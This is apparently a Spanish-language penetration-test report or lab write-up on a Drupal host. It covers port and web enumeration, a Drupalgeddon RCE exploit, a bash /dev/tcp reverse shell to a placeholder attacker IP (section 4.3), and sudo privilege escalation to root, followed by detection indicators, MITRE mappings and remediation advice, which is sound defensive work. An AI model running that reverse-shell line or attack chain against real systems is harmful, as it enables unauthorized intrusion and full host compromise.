# Informe de Seguridad - Evaluación de Host Drupal

## 1. Resumen Ejecutivo

Se ha realizado una evaluación de seguridad sobre un host Linux que ejecuta un servicio web basado en Drupal.

Durante el análisis se identificó una vulnerabilidad crítica que permite la ejecución remota de comandos (RCE), lo que conduce a:

- Acceso inicial al sistema
- Ejecución de comandos arbitrarios
- Escalada de privilegios locales
- Compromiso total del host

### Impacto

- Acceso no autorizado al sistema
- Ejecución remota de código
- Escalada a usuario root
- Control total del servidor

### Nivel de riesgo: **CRÍTICO**

---

## 2. Alcance

- Objetivo: Host Linux (Drupal)
- Servicio principal: HTTP (Drupal CMS)
- Tipo de prueba: Black Box
- Metodología: Enumeración → Explotación → Escalada

---

## 3. Enumeración

### 3.1 Escaneo de puertos

    nmap -p- --open -sS -Pn --min-rate 5000 <IP>

### Puertos relevantes:

- 22 – SSH
- 80 – HTTP

---

### 3.2 Enumeración web

Acceso al servicio HTTP revela:

- Aplicación CMS Drupal expuesta
- Posible versión vulnerable

Herramientas utilizadas:

    gobuster dir -u http://<IP> -w <wordlist>

Resultado:

- Descubrimiento de rutas internas
- Identificación de estructura web

---

## 4. Explotación (Acceso inicial)

### 4.1 Identificación de vulnerabilidad

El CMS Drupal es vulnerable a ejecución remota de comandos (Drupalgeddon).

---

### 4.2 Ejecución de exploit

Se utiliza un exploit público para ejecutar comandos remotos.

Ejemplo:

    python3 exploit.py http://<IP>

Resultado:

- Ejecución de comandos en el sistema
- Obtención de shell inicial

---

### 4.3 Reverse shell

Se establece una reverse shell hacia la máquina atacante.

    bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1

Resultado:

- Acceso interactivo al sistema como usuario web

---

## 5. Escalada de privilegios

### 5.1 Enumeración local

Se revisan permisos y configuraciones:

    sudo -l

Resultado:

- Usuario puede ejecutar binarios con privilegios elevados

---

### 5.2 Abuso de privilegios SUDO

Se identifica ejecución permitida de un binario vulnerable.

Ejemplo:

    sudo <binario>

Se abusa del binario para ejecutar comandos como root.

---

### 5.3 Obtención de root

Resultado final:

    uid=0(root) gid=0(root)

---

## 6. Evidencias

- Servicio Drupal vulnerable expuesto
- Ejecución remota de comandos confirmada
- Reverse shell establecida
- Escalada de privilegios exitosa
- Acceso root obtenido

---

## 7. Visión SOC (Detección y Monitorización)

### 7.1 Indicadores de compromiso (IoC)

- Peticiones HTTP maliciosas hacia Drupal
- Ejecución de comandos desde servidor web
- Conexiones salientes sospechosas (reverse shell)
- Uso anómalo de sudo

---

### 7.2 Logs relevantes

#### Web Server Logs

- Requests anómalos (payloads RCE)
- Accesos a endpoints sospechosos

---

#### System Logs

    /var/log/auth.log

- Uso de sudo
- Elevación de privilegios

---

#### Network Logs

- Conexiones salientes a IP atacante
- Tráfico no habitual

---

### 7.3 Técnicas MITRE ATT&CK

- T1190 – Exploit Public-Facing Application  
- T1059 – Command Execution  
- T1071 – Application Layer Protocol  
- T1068 – Privilege Escalation  
- T1055 – Process Injection  

---

## 8. Recomendaciones

### 8.1 Aplicación web

- Actualizar Drupal a versión segura
- Aplicar parches de seguridad críticos
- Implementar WAF

---

### 8.2 Sistema

- Revisar permisos sudo
- Aplicar principio de mínimo privilegio
- Monitorizar ejecución de comandos

---

### 8.3 Red

- Restringir conexiones salientes
- Monitorizar tráfico anómalo

---

### 8.4 Monitorización

- Alertas por ejecución remota de comandos
- Detección de reverse shells
- Correlación de logs web + sistema

---

## 9. Conclusión

Cadena de ataque:

1. Enumeración de servicios  
2. Identificación de Drupal vulnerable  
3. Explotación RCE (Drupalgeddon)  
4. Reverse shell  
5. Enumeración local  
6. Escalada mediante sudo  
7. Acceso root  

El compromiso fue posible debido a:

- Software desactualizado
- Exposición de servicio vulnerable
- Configuración insegura de privilegios
- Falta de monitorización

Resultado final: **compromiso total del sistema**
